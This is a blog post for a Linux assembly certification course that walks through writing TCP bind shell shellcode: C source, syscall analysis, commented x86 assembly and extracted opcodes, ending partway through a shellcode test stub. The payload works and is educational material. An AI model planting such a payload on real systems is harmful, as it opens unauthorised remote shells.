<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Brett Lischalk | SLAE Problem 1: TCP Bind Shell Shellcode</title>
  <meta name="description" content="From my experience playing around with socket programming in C and Python, there is a basic formula and group of function calls for creating clients and servers. Most of them will be useful to us. A couple won't be applicable to our situation.">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="SLAE Problem 1: TCP Bind Shell Shellcode">
  <meta property="og:type" content="website">
  <meta property="og:url" content="http://brettlischalk.com//posts/slae-problem-1-tcp-bind-shellcode">
  <meta property="og:description" content="From my experience playing around with socket programming in C and Python, there is a basic formula and group of function calls for creating clients and servers. Most of them will be useful to us. A couple won't be applicable to our situation.">
  <meta property="og:site_name" content="Brett Lischalk">
  <meta property="og:image" content="http://brettlischalk.com//assets/og-image.jpg">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="http://brettlischalk.com//posts/slae-problem-1-tcp-bind-shellcode">
  <meta name="twitter:title" content="SLAE Problem 1: TCP Bind Shell Shellcode">
  <meta name="twitter:description" content="From my experience playing around with socket programming in C and Python, there is a basic formula and group of function calls for creating clients and servers. Most of them will be useful to us. A couple won't be applicable to our situation.">
  <meta name="twitter:image" content="http://brettlischalk.com//assets/og-image.jpg">

  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
  <link href="http://brettlischalk.com//feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />

  
    <link type="text/css" rel="stylesheet" href="/assets/dark.css">
  
</head>

<body>
  <main role="main">
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav reveal">
  <a href="/" class="header-logo" title="Brett Lischalk">Brett Lischalk</a>
  <ul class="header-links">
    
      <li>
        <a href="/about" title="About me">
          <span class="icon icon-android-person"></span>
        </a>
      </li>
    
    
    
    
    
    
    
    
    
    
      <li>
        <a href="/feed.xml" target="_blank" title="RSS">
          <span class="icon icon-social-rss"></span>
        </a>
      </li>
    
  </ul>
</nav>

        <article class="article reveal">
          <header class="article-header">
            <h1>SLAE Problem 1: TCP Bind Shell Shellcode</h1>
            <p>From my experience playing around with socket programming in C and Python, there is a basic formula and group of function calls for creating clients and servers. Most of them will be useful to us. A couple won't be applicable to our situation.</p>
            <div class="article-list-footer">
              <span class="article-list-date">
                December 18, 2016
              </span>
              <span class="article-list-divider">-</span>
              <span class="article-list-minutes">
                
                
                  15 minute read
                
              </span>
              <span class="article-list-divider">-</span>
              <div class="article-list-tags">
                
                  <a href="/tag/asm">asm</a>
                
                  <a href="/tag/shellcode">shellcode</a>
                
                  <a href="/tag/c">c</a>
                
              </div>
            </div>
          </header>

          <div class="article-content">
            <h1 id="assignment-1">Assignment 1</h1>

<p>This blog post has been created for completing the requirements foe
the SecurityTube Linux Assembly Expert certification:
<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></p>

<p>Student ID: SLAE-824</p>

<h2 id="requirements">Requirements</h2>

<ul>
  <li>Create a Shell Bind TCP shellcode
– Bind to a port
– Execs Shell on incoming connection</li>
  <li>Port number should be easily configurable</li>
</ul>

<h2 id="source-code">Source Code</h2>

<p>The source code referenced in this article can be found here:
<a href="https://github.com/blischalk/slae/tree/master/exercise1">TCP Bindshell Source and Tools</a></p>

<h2 id="strategy">Strategy</h2>

<p>My approach to building a tcp bind shell shellcode will be to:</p>

<ul>
  <li>Create a C program which illustrates the basic functionality</li>
  <li>Analyze the C program system calls to see how the program interacts with the kernel to accomplish its tasks</li>
  <li>Lookup the system calls and see what arguments and structures they take</li>
  <li>Attempt to write some assembly that calls the same system calls in the same order with the same arguments as the C program does</li>
  <li>Debug issues as of course there will be :)</li>
</ul>

<h2 id="the-c-program">The C program</h2>

<p>From my experience playing around with socket programming in C and
Python, there is a basic formula and group of function calls for
creating clients and servers. Most of them will be useful to us. A
couple won’t be applicable to our situation.  The functions we will
find useful are:</p>

<ul>
  <li>Socket: Open a socket over which we will communicate. Essentially a file descriptor</li>
  <li>Bind: Bind our socket to an interface on our system</li>
  <li>Listen: Tell our system that we are ready to start accepting connections</li>
  <li>Accept: Accept the connection. This is a necessary next step as listen will generally queue up connections in anticipation of them being accepted</li>
</ul>

<p>Functions we won’t worry about:</p>

<ul>
  <li>Send</li>
  <li>Recv</li>
  <li>Connect</li>
  <li>Close</li>
</ul>

<p>We won’t worry about send or recv because they are used for managing
the flow of data coming in and out and acting accordingly.  We are
instead going to just redirect stdin, stdout, and stderr over the
socket using a function called dup2 and not worry about managing the
flow of data. Since we aren’t connecting to another system/server we
don’t need to worry about connect. And as for close, it is generally
good practice to close files after your done with them but one leaked
file descriptor won’t hurt anyone right? We need to trim the fat!</p>

<p>The final step after we get our redirection going is we just need to
run a program, in our case @/bin/sh@ and its output and input should
be connected to our socket. We can run this program using ~execve~.</p>

<p>So lets get some code going!</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
#include &lt;netinet/in.h&gt;
#define PORT 4444
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// Create a socket
</span>  <span class="kt">int</span> <span class="n">lsock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="c1">// Setup servr side config struct
</span>  <span class="c1">// We configure:
</span>  <span class="c1">// The family:IPv4
</span>  <span class="c1">// The interface: 0.0.0.0 (any)
</span>  <span class="c1">// The port: port#
</span>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">config</span><span class="p">;</span>
  <span class="n">config</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
  <span class="n">config</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
  <span class="c1">// The htons() function converts the
</span>  <span class="c1">// unsigned short integer hostshort from host byte
</span>  <span class="c1">// order to network byte order.
</span>  <span class="n">config</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

  <span class="c1">// Bind the created socket with the interface
</span>  <span class="c1">// specified in the configuration
</span>  <span class="n">bind</span><span class="p">(</span><span class="n">lsock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">config</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">config</span><span class="p">));</span>

  <span class="c1">// Listen on the socket
</span>  <span class="n">listen</span><span class="p">(</span><span class="n">lsock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="c1">// Accept the incoming connection
</span>  <span class="kt">int</span> <span class="n">csock</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">lsock</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

  <span class="c1">// Redirect stdin, stdout, and stderror
</span>  <span class="n">dup2</span><span class="p">(</span><span class="n">csock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">dup2</span><span class="p">(</span><span class="n">csock</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
  <span class="n">dup2</span><span class="p">(</span><span class="n">csock</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

  <span class="c1">// Execute a shell
</span>  <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">};</span></code></pre></figure>

<p>Compiling this code with ~gcc bindshell.c -o bindshell~ gives us a
nice executable. Running the executable with ~./bindshell~ and then
looking at our network using ~netstat -antp~ yields something very
interesting…</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@blahblah:~# </span>netstat -atp Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
Proto Local Address Foreign Address State PID/Program
name tcp <span class="k">*</span>:4444 <span class="k">*</span>:<span class="k">*</span> LISTEN 1657/bindshell</code></pre></figure>

<p>Excellent! We have /bin/sh listen bound to a port. If we open up
another terminal and use netcat to connect to port 4444 by running ~nc
-nv -nv 127.0.0.1 4444~ we will get:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@blahblah:~# </span>nc -nv 127.0.0.1 4444 <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 4444 <span class="o">(</span>?<span class="o">)</span>
open id <span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span></code></pre></figure>

<p>Perfect! We have a tcp bind shell connection. Now we have to convert this to assembly</p>

<h2 id="analysis-of-the-c-program">Analysis of the C program</h2>

<p>We can use a tool called @strace@ to help us learn more about what
system calls our bind shell c program is making. Running ~strace
./bindshell~, connecting to the bindshell with ~nc -nv 127.0.0.1 4444~
and filtering out the noise we will see:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@blahblah:~/shared/SLAE/slae/exercise1# </span>strace ./bindshell
execve<span class="o">(</span><span class="s2">"./bindshell"</span>, <span class="o">[</span><span class="s2">"./bindshell"</span><span class="o">]</span>, <span class="o">[</span>/<span class="k">*</span> 41 vars <span class="k">*</span>/]<span class="o">)</span> <span class="o">=</span> 0
socket<span class="o">(</span>PF_INET, SOCK_STREAM, IPPROTO_IP<span class="o">)</span> <span class="o">=</span> 3
<span class="nb">bind</span><span class="o">(</span>3, <span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET, <span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span>4444<span class="o">)</span>, <span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">"0.0.0.0"</span><span class="o">)}</span>, 16<span class="o">)</span> <span class="o">=</span> 0
listen<span class="o">(</span>3, 0<span class="o">)</span>                            <span class="o">=</span> 0
accept<span class="o">(</span>3,
dup2<span class="o">(</span>4, 0<span class="o">)</span>                              <span class="o">=</span> 0
dup2<span class="o">(</span>4, 1<span class="o">)</span>                              <span class="o">=</span> 1
dup2<span class="o">(</span>4, 2<span class="o">)</span>                              <span class="o">=</span> 2
execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, <span class="o">[</span>0], <span class="o">[</span>/<span class="k">*</span> 0 vars <span class="k">*</span>/]<span class="o">)</span>  <span class="o">=</span> 0</code></pre></figure>

<p>Ok. It looks like our code makes some system calls that seem to align
with the functions we know to be part of our socket programming
formula along with the stdin, stdout, and stderror redirection and our
~execve~ call to run /bin/sh.</p>

<p>Lets lookup the system calls to find out their system call numbers. We
will consult ~/usr/include/i386-linux-gnu/asm/unistd_32.h~ for these
numbers.</p>

<p>When we consult the listing of syscalls we encounter a bit of
confusion. The only system calls that seem to closely match up with
what we saw in our strace are:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define __NR_execve 11
#define __NR_dup2 63
#define __NR_socketcall 102
#define __NR_mbind 274</span></code></pre></figure>

<p>This is strange. ~execve~ and ~dup2~ look good but there doesn’t seem
to be any syscall numbers for socket,listen, or accept. socketcall
seems a bit odd as does mbind so we will have to look into this.</p>

<p>Consulting ~man socketcall~ we learn:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">int socketcall<span class="o">(</span>int call, unsigned long <span class="k">*</span>args<span class="o">)</span>;

/<span class="k">**</span>
socketcall<span class="o">()</span> is a common kernel entry point <span class="k">for </span>the socket system
calls.  call determines which socket <span class="k">function </span>to invoke.  args points
to a block containing the actual arguments, which are passed through
to the appropriate call.

User programs should call the appropriate functions by their usual
names.  Only standard library implementors and kernel hackers need to
know about socketcall<span class="o">()</span>.
<span class="k">**</span>/</code></pre></figure>

<p>So that seems to explain things a little bit. The first argument to
socketcall is a number that represents the actual socket api function
that we want to be calling. Ok. Where do we get the number associated
with each of the api calls?</p>

<p>A little Google search for socketcall call numbers brings us:</p>

<p><a href="http://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html">socketcall call numbers</a></p>

<p>In this blog post we confirm our knowledge about the first argument of
socketcall as well as learn about ~/usr/include/linux/net.h~</p>

<p>Lets checkout that file and see if we can learn the numbers we are looking for.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define SYS_SOCKET  1   </span><span class="cm">/* sys_socket(2)    */</span><span class="cp">
#define SYS_BIND    2   </span><span class="cm">/* sys_bind(2)      */</span><span class="cp">
#define SYS_LISTEN  4   </span><span class="cm">/* sys_listen(2)    */</span><span class="cp">
#define SYS_ACCEPT  5   </span><span class="cm">/* sys_accept(2)    */</span><span class="cp">
</span><span class="o">//</span> <span class="p">...</span> <span class="n">snip</span></code></pre></figure>

<p>So it looks like the ~mbind~ syscall we saw earlier might not be
necessary as it looks like there is a ~bind~ syscall number that we
can call with ~socketcall~.  We’ll try that out and see how that goes.</p>

<p>Now that we know the syscalls and their corresponding numbers, we need
to figure out their function signatures so that we know what sort of
arguments we need to be passing to them when we invoke them. The
function signatures look like the following:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">socketcall</span><span class="p">(</span><span class="kt">int</span> <span class="n">call</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">args</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocol</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">bind</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">listen</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">backlog</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">accept</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="o">*</span><span class="n">addrlen</span><span class="p">)</span>
<span class="kt">int</span> <span class="n">dup2</span><span class="p">(</span><span class="kt">int</span> <span class="n">oldfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">newfd</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">execve</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]);</span>
<span class="o">//</span> <span class="p">...</span> <span class="n">snip</span></code></pre></figure>

<p>We also leveraged 2 structs in our C program which we will most likely
need to replicate.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;netinet/in.h&gt;
</span>
<span class="c1">// All pointers to socket address structures are often cast to pointers
// to this type before use in various functions and system calls:
</span>
<span class="k">struct</span> <span class="n">sockaddr</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">short</span>    <span class="n">sa_family</span><span class="p">;</span>    <span class="c1">// address family, AF_xxx
</span>    <span class="kt">char</span>              <span class="n">sa_data</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span>  <span class="c1">// 14 bytes of protocol address
</span><span class="p">};</span>


<span class="c1">// IPv4 AF_INET sockets:
</span>
<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="p">{</span>
    <span class="kt">short</span>            <span class="n">sin_family</span><span class="p">;</span>   <span class="c1">// e.g. AF_INET, AF_INET6
</span>    <span class="kt">unsigned</span> <span class="kt">short</span>   <span class="n">sin_port</span><span class="p">;</span>     <span class="c1">// e.g. htons(3490)
</span>    <span class="k">struct</span> <span class="n">in_addr</span>   <span class="n">sin_addr</span><span class="p">;</span>     <span class="c1">// see struct in_addr, below
</span>    <span class="kt">char</span>             <span class="n">sin_zero</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>  <span class="c1">// zero this if you want to
</span><span class="p">};</span></code></pre></figure>

<p>Ok. Using what we have gathered from our analysis lets take an attempt
at writing some assembly!</p>

<h2 id="assembly-take-1">Assembly: Take 1</h2>

<p>Lets lookup some values of constants:</p>

<p>~/usr/src/linux-headers-4.0.0-kali1-common/include/linux/socket.h~</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define AF_INET   2 </span><span class="cm">/* Internet IP Protocol   */</span></code></pre></figure>

<p>I had a hard time finding where ~SOCK_STREAM~ was defined so we use a
little gcc magic to see what the macro expands to:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@blahblah:~/shared/SLAE/slae/exercise1# </span>gcc -DN -E bindshell.c | grep SOCK_STREAM
SOCK_STREAM <span class="o">=</span> 1,
int lsock <span class="o">=</span> socket<span class="o">(</span>2, SOCK_STREAM, 0<span class="o">)</span>;</code></pre></figure>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define INADDR_ANY ((unsigned long int) 0x00000000)</span></code></pre></figure>

<p>And now the assembly:</p>

<figure class="highlight"><pre><code class="language-asm" data-lang="asm">global _start
 Note: We will store 2 file descriptors along the way
 We will put the listening socket file descriptor in edi
 We will put the connection socket file descriptor in ebx

section .text
_start:
  ;; Create a socket
  ;; int socketcall(int call, unsigned long *args);
  ;; int socket(int domain, int type, int protocol);
  ;; #define SYS_SOCKET 1   /* sys_socket(2)    */
  ;; Use socketcall to call down to socket
  xor eax, eax
  mov al, 0x66 ; socketcall syscall
  xor ebx, ebx
  mov bl, 0x1 ; sys_socket syscall number

  ;; Put the socket() args on the stack
  xor ecx, ecx
  push ecx ; INADDR_ANY Accept on any interface 0x00000000
  push ebx ; SOCK_STREAM is the type of socket 1
  push 0x2 ; Protocol AF_INET is the IP Protocol 2

  mov ecx, esp ; Save pointer to args for the socket() call
  int 0x80 ; call sys_socket

  ; Save the returned listening socket file descriptor
  xor edi, edi
  mov edi, eax

  ;; Bind the socket
  ;; Use socketcall to call down to socket
  xor eax, eax
  mov al, 0x66 ; socketcall syscall
  xor ebx, ebx
  mov bl, 0x2 ; sys_bind syscall number

  ;; Start building the sockaddr_in structure
  ;; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  ; sin_addr=0 (INADDR_ANY)
  ; INADDR_ANY Accept on any interface 0x00000000
  xor ecx, ecx
  push ecx

  ;; 4444 is 0x115c in little endian. Network byte order is
  ;; Big endian so we swap the byte ordering
  push word 0x5c11 ; sin_port=4444 (network byte order)
  push word bx     ; sin_family=AF_INET (0x2)
  mov ecx, esp     ; move pointer to sockaddr_in structure

  ;; In the initial code we use sizeof to derive the addrlen
  ;; If we print the results of that we get 0x10 which is 16 bytes
  push 0x10 ;addrlen=16
  push ecx  ;struct sockaddr pointer
  push edi  ;sockfd
  mov ecx, esp ;save pointer to bind() args
  int 0x80 ; call sys_bind

  ;; Call listen and prepare for accepting connections
  xor eax, eax
  mov al, 0x66 ; socketcall syscall
  xor ebx, ebx
  mov bl, 0x4 ; sys_listen syscall number

  ;; Place listen's arguments on the stack
  xor ecx, ecx
  push ecx ; backlog we set to zero
  push edi ; push the socket file descriptor
  mov ecx, esp ; place a pointer to the args in ecx
  int 0x80 ; call sys_listen

  ;; Call accept
  xor eax, eax
  mov al, 0x66 ; socketcall syscall
  xor ebx, ebx
  mov bl, 0x5 ; sys_accept syscall number
  ;; Place accept's arguments on the stack
  ;; We don't need a peer socket???... so we
  ;; use nulls for addrlen and sockaddr struct
  xor ecx, ecx
  push ecx ; Push NULL (0x00000000) for addrlen
  push ecx ; Push NULL (0x00000000) for sockaddr struct
  push edi ; Push the listening sockets file descriptor
  mov ecx, esp ; place a pointer to the args in ecx
  int 0x80 ; call sys_accept

  ;; Save the returned connection socket file descriptor
  xor ebx, ebx
  mov ebx, eax

  ;; Call dup2 for stdin, stdout, and stderr in a loop
  xor ecx, ecx
  mov cl, 0x2 ;loop counter
dup2:
  mov al, 0x3f ;dup2
  int 0x80
  dec ecx
  jns dup2

  ;; Call execve
  xor eax, eax
  mov al, 0xb ;execve
  xor ebx, ebx
  push ebx
  push 0x68732f2f ;"sh//"
  push 0x6e69622f ;"nib/"
  mov ebx, esp
  xor ecx, ecx
  xor edx, edx
  int 0x80</code></pre></figure>

<p>When we compile the above shellcode using the compile.sh script below:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="nb">echo</span> <span class="s1">'[+] Assembling with Nasm ... '</span>
nasm -f elf32 -o <span class="nv">$1</span>.o <span class="nv">$1</span>.nasm

<span class="nb">echo</span> <span class="s1">'[+] Linking ...'</span>
ld -o <span class="nv">$1</span> <span class="nv">$1</span>.o

<span class="nb">echo</span> <span class="s1">'[+] Done!'</span></code></pre></figure>

<p>~root@blahblah:~/shared/SLAE/slae/exercise1# ./compile.sh bindshellasm~</p>

<p>And run the shellcode using:</p>

<p>~root@blahblah:~/shared/SLAE/slae/exercise1# ./bindshellasm~</p>

<p>And connect using netcat:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="gp">root@blahblah:~/shared/SLAE/slae/exercise1# </span>nc -nv 127.0.0.1 4444
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 4444 <span class="o">(</span>?<span class="o">)</span> open
id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span></code></pre></figure>

<p>Bingo! Our assembly works and gives us a tcp bind shell. Now we need
to test it in our c program stub. We will use some command line fu to
get the opcodes from our binary:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@funos:~/shared/SLAE/slae/exercise1# </span>objdump -d ./bindshellasm|grep <span class="s1">'[0-9a-f]:'</span>| <span class="se">\</span>
grep -v <span class="s1">'file'</span>|cut -f2 -d:|cut -f1-6 -d<span class="s1">' '</span>|tr -s <span class="s1">' '</span>|tr <span class="s1">'\t'</span> <span class="s1">' '</span><span class="se">\</span>
|sed <span class="s1">'s/ $//g'</span>|sed <span class="s1">'s/ /\\x/g'</span>|paste -d <span class="s1">''</span> -s |sed <span class="s1">'s/^/"/'</span>|sed <span class="s1">'s/$/"/g'</span>

<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">66"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">04"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">51"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">49"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span></code></pre></figure>

<p>We add our opcodes to a stub tester C program:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
<span class="s">"</span><span class="se">\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51</span><span class="s">"</span>
